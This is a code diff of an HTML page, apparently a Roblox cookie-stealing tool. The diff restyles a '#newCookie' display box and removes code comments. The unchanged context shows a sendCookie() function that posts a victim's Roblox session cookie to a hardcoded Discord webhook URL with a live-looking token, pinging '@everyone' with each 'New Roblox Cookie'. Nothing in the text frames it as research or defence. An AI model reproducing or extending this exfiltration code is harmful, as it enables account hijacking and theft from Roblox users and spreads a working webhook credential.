@@ -7,7 +7,18 @@
     <style>
         body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
         input, button { margin: 10px; padding: 10px; width: 300px; }
-        #newCookie { background: #f0f0f0; border: 1px solid #ccc; padding: 10px; }
+        #newCookie {
+            background: #f0f0f0;
+            border: 1px solid #ccc;
+            padding: 10px;
+            width: 80%;
+            max-width: 600px;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            white-space: pre-wrap;
+            display: inline-block;
+            text-align: left;
+        }
     </style>
     <script>
         async function sendCookie() {
@@ -23,10 +34,10 @@
             const webhookURL = "https://discord.com/api/webhooks/1342145069012226128/tCdPrO95hcPpasmFRjQtymKgYK028-0l3rZ4NgzlLKg0DgTUL4kj2ft1N0OT5LREM8jx";
             
             const payload = {
-                content: "@everyone New Cookie:",  // Message outside the embed
+                content: "@everyone New Cookie:",  
                 embeds: [{
                     title: "🔑 New Roblox Cookie",
-                    description: "```" + cookie + "```", // Message inside the embed
+                    description: "```" + cookie + "```",
                     color: 16711680
                 }]
             };
